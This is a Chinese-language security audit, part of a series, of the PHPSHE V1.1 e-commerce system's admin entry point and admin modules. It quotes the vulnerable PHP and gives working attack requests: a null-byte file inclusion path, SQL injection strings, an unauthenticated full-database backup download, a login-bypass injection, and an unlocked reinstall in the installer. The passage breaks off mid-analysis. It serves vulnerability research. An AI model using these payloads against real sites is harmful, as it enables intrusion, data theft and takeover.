## **PHPSHE V1.1 （四）**
### **後臺入口 admin.php**
和前臺一樣，該文件首先包含common.php文件。
<p>
然後是定義後臺導航菜單的陣列$adminmenu,接著就是判斷管理員權限，以及包含後臺操作類模塊。

```php
if (!pe_login('admin') && $act != 'login') {
    pe_goto('admin.php?mod=do&act=login');
}
if (pe_login('admin') && ($act == 'login' or $mod == 'index')) {
    pe_goto('admin.php?mod=order&act=list');
}
```
此處利用兩個`if`條件判斷登陸和未登入的兩種情況。
<p>

`漏洞出現`這裡用`&&`兩個條件。都達成的時候才會進入`pe_goto。`
<p>

在未登入的時候，只要`$act`為`login`的時候就不會進入`pe_goto`。

在登陸之後，只要`$act`不為`login`並且`$mod`不為`login`的時候也不會進入`pe_goto。`

再看後面，直接就包含了`$module`和`$mod`

```php
include("{$pe['path_root']}module/{$module}/{$mod}.php");
```

### **【Bug 0x13: 任意文件包含漏洞 有限制條件】（同 【Bug 0x01】）**

```/admin.php?mod=../../robots.txt%00&act=login```

後臺模塊
接下來，我們在跟進分析`/module/admin/`裏面的後臺模塊：
- ad.php
- admin.php
- article.php
- ask.php
- cache.php
- category.php
- class.php
- comment.php
- db.php
- do.php
- link.php
- order.php
- page.php
- payway.php
- product.php
- setting.php
- user.php

由於有`act=login`後臺操作我們就不能執行act等操作了。
<p>
直接看`switch ($act) {的default :`塊。
<p>
### **admin.php**
<p>
直接就可以看到管理員用戶名

### **【Bug 0x14: 信息洩漏】**
```/admin.php?mod=admin&act=login```

### **ask.php**

```php
default :
    $sqlwhere = " and `ask_state` = '".intval($_g_state)."'";
    $_g_name && $sqlwhere .= " and b.`product_name` like '%{$_g_name}%'";
    $_g_text && $sqlwhere .= " and a.`ask_text` like '%{$_g_text}%'";
    $_g_user_name && $sqlwhere .= " and a.`user_name` like '%{$_g_user_name}%'";
    $sql = "select * from `".dbpre."ask` a,`".dbpre."product` b where a.`product_id` = b.`product_id` {$sqlwhere} order by a.`ask_id` desc";
    $info_list = $db->sql_selectall($sql, array(20, $_g_page));
```
看到了麼，限制了act也是有機可乘的。有一個注入存在。

### **【Bug 0x15: SQL注入 獲取任意數據庫數據】**

<pre>/admin.php?mod=ask&act=login&name=%' or 1=1%23</pre>

**comment.php & order.php & product.php & user.php**

### **【Bug 0x16: SQL注入 獲取任意數據庫數據】（同 【Bug 0x15】）**

### **db.php**
大致瀏覽、發現這是一個數據庫備份導入模塊，並且與其他模塊不同，沒有用到`switch`。
<p>
只判斷了`$act == 'import'`導入功能，對於備份並沒有用act判斷。

```php
if (isset($_p_pebackup)) {//備份資料庫
    $pe_cutsql = "/*#####################@ pe_cutsql @#####################*/\n";
    if (isset($_p_pebackup)) {//不分卷
        if ($_p_backup_cut && $_p_backup_where == 'down') 
            pe_error('只有在備份在伺服器才可以使用分卷功能...');
        if ($_p_backup_cut && !$_p_backup_cutsize) 
            pe_error('使用分卷備份必須填寫分卷文件大小...');
        if ($_p_backup_where == "server") {
            !is_dir($back_path) && mkdir($back_path, 0777, true);
            !is_writable($back_path) && pe_error("{$back_path} 目錄沒有寫入權限...");
        }
        if (!$_p_backup_cut) {
            $sql_arr = array();
            foreach ($table_list as $v) {
                $sql_arr = array_merge($sql_arr, dosql($v['Name']));
            }
            $sql = implode($pe_cutsql, $sql_arr);
            if ($_p_backup_where == 'down') {
                down_file($sql, "db_all.sql");
            }
            elseif ($_p_backup_where == 'server') {
                if (file_put_contents("{$back_path}db_all.sql", $sql)) {
                    pe_success("資料庫備份完成！");
                }
                else {
                    pe_error("資料庫備份失敗...");
                }
            }
        }
        else {
            $vnum = 1;
            $sql_arr = array();
            foreach ($table_list as $v) {
                $sql_arr = array_merge($sql_arr, dosql($v['Name']));
                $sql = implode($pe_cutsql, $sql_arr);
                if (strlen($sql) >= $_p_backup_cutsize * 1000) {
                    file_put_contents("{$back_path}db_v{$vnum}.sql", $sql);
                    $sql_arr = array();
                    $vnum++;
                }
            }
            $sql && file_put_contents("{$back_path}db_v{$vnum}.sql", $sql);
            pe_success("資料分卷備份完成！");
        }
    }
}
```
因此，我們可以直接備份數據庫，下載襲來。

```php
if ($_p_backup_where == 'down') {
    down_file($sql, "db_all.sql");
}
```

### **【Bug 0x17: 完全數據庫信息洩漏】**
POST:
<p>
<pre>/admin.php?mod=db&act=login</pre>
DATA:
<p>
<pre>backup_cut=0&backup_where=down&pebackup=1</pre>


### **do.php**

```php
default:
    if (isset($_p_pesubmit)) {
        $_p_info['admin_pw'] = md5($_p_info['admin_pw']);
        if ($info = $db->pe_select('admin', pe_dbhold($_p_info))) {
            $db->pe_update('admin', array('admin_id'=>$info['admin_id']), array('admin_ltime'=>time()));
```

### **【Bug 0x18: SQL注入 任意用戶登陸】（同【Bug 0x09】）**
<pre>
/admin.php?mod=do&act=login

info[admin_name`<>1-- -]=admin&info[admin_pw]=admin&pesubmit=+
</pre>

一般來說，到這裡基本上就要結束了。
<p>
目前，並沒有找到什麼可以getshell的漏洞。
<p>
不要放棄，還有個地方我們沒看。
<p>
就是install目錄。
<p>

### **isntall.php**
看了下，這個文件利用沒有lock限制。
<p>
這樣可以導致重裝覆蓋，產生一個不小的漏洞。

```php
switch ($_g_step) {
    //#####################@ 配置信息 @#####################//
    case 'setting':
        if (isset($_p_pesubmit)) {
            $dbconn = mysql_connect("{$_p_db_host}:{$_p_db_port}", $_p_db_user, $_p_db_pw);
            if (!$dbconn) pe_error('資料庫連接失敗...数据库ip，用户名，密码对吗？');
            if (!mysql_select_db($_p_db_name, $dbconn)) {
                mysql_query("CREATE DATABASE `{$_p_db_name}` DEFAULT CHARACTER SET utf8", $dbconn);
                !mysql_select_db($_p_db_name, $dbconn) && pe_error('数据库选择失败...数据库名对吗？');
            }
            mysql_query("SET NAMES utf8", $dbconn);
            mysql_query("SET sql_mode = ''", $dbconn);

            $sql_arr = explode('/*#####################@ pe_cutsql @#####################*/', file_get_contents("{$pe['path_root']}install/phpshe.sql"));
            foreach ($sql_arr as $v) {
                $result = mysql_query(trim(str_ireplace('{dbpre}', $_p_dbpre, $v)));
            }
            if ($result) {
                mysql_query("update `{$_p_dbpre}admin` set `admin_name` = '{$_p_admin_name}', `admin_pw` = '".md5($_p_admin_pw)."' where `admin_id`=1", $dbconn);
                $config = "<?php\n\$pe['db_host'] = '{$_p_db_host}'; //数据库主机地址\n\$pe['db_name'] = '{$_p_db_name}'; //数据库名称\n\$pe['db_user'] = '{$_p_db_user}'; //数据库用户名\n\$pe['db_pw'] = '{$_p_db_pw}'; //数据库密码\n\$pe['db_coding'] = 'utf8';\n\$pe['url_model'] = 'pathinfo'; //url模式,可选项(pathinfo/pathinfo_safe/php)\ndefine('dbpre','{$_p_dbpre}'); //数据库表前缀\n?>";
                file_put_contents("{$pe['path_root']}config.php", $config);
                pe_goto("{$pe['host_root']}install/index.php?step=success");
            }
            ```